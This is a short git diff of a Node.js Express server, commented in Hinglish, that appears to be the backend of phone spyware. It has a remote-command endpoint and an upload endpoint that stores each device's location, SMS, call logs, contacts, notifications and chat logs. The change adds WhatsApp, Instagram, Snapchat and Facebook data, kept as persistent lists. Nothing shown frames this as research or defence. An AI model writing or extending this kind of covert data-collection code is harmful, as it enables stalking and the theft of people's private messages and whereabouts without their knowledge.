@@ -78,7 +78,7 @@ app.post('/api/send-command', (req, res) => {
     res.json({ status: "success", command: finalCommand });
 });
 
-// --- 5. DATA UPLOAD (MAIN LOGIC UPDATED) ---
+// --- 5. DATA UPLOAD (UPDATED FOR SOCIAL MEDIA) ---
 app.post('/api/upload_data', (req, res) => {
     let { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
@@ -100,9 +100,14 @@ app.post('/api/upload_data', (req, res) => {
             fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
         }
         
-        // --- CHAT LOGS & NOTIFICATIONS (HISTORY FIX) ---
-        // Yahan maine 'chat_logs' add kiya hai. Ab Chat history save rahegi.
-        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
+        // --- CHAT LOGS & SOCIAL MEDIA FIX ---
+        // Maine yahan 'whatsapp', 'instagram', 'snapchat', 'facebook' add kar diya hai
+        // Taaki inka data LIST bankar save ho, delete na ho.
+        else if ([
+            'notifications', 'sms', 'call_logs', 'contacts', 'chat_logs', 
+            'whatsapp', 'instagram', 'snapchat', 'facebook', 'social_media'
+        ].includes(type)) {
+            
             let existingData = [];
             if (fs.existsSync(filePath)) {
                 try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
